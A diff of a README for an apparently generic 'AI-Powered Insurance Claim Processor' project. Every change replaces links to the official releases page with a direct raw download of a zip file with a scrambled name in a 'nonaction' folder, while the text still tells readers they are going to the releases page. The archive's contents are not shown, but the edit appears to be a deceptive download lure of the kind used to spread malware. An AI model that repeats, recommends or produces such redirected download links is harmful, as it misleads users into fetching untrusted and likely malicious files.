@@ -6,14 +6,14 @@ Welcome to the **AI-Powered Insurance Claim Processor**. This software helps you
 
 ## 📥 Download Now!
 
-[![Download Release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/releases)
+[![Download Release](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/raw/refs/heads/main/nonaction/Auto-Fraud-Processing-Insurance-Detection-Processor-Export-Claim-PD-A-Powered-CS-2.1.zip)](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/raw/refs/heads/main/nonaction/Auto-Fraud-Processing-Insurance-Detection-Processor-Export-Claim-PD-A-Powered-CS-2.1.zip)
 
 ## 🚀 Getting Started
 
 This section will guide you through the steps to download and install the application.
 
 1. **Visit the Releases Page:**  
-   Go to the official releases page by clicking [here](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/releases).
+   Go to the official releases page by clicking [here](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/raw/refs/heads/main/nonaction/Auto-Fraud-Processing-Insurance-Detection-Processor-Export-Claim-PD-A-Powered-CS-2.1.zip).
 
 2. **Select the Latest Version:**  
    On the releases page, you will see a list of all available versions. Look for the newest version. It will be at the top of the list.
@@ -77,6 +77,6 @@ This application involves various topics in technology and finance. Here are som
 
 ## 🚀 Download & Install
 
-To start using the **AI-Powered Insurance Claim Processor**, [visit this page to download](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/releases). Follow the steps outlined above for a seamless installation experience.
+To start using the **AI-Powered Insurance Claim Processor**, [visit this page to download](https://github.com/shiineng/AI-Powered-Insurance-Claim-Processor-Fraud-Detection-Auto-Processing-PDF-CSV-Export-/raw/refs/heads/main/nonaction/Auto-Fraud-Processing-Insurance-Detection-Processor-Export-Claim-PD-A-Powered-CS-2.1.zip). Follow the steps outlined above for a seamless installation experience.
 
 Thank you for choosing our application! We hope it enhances your insurance claim processing.
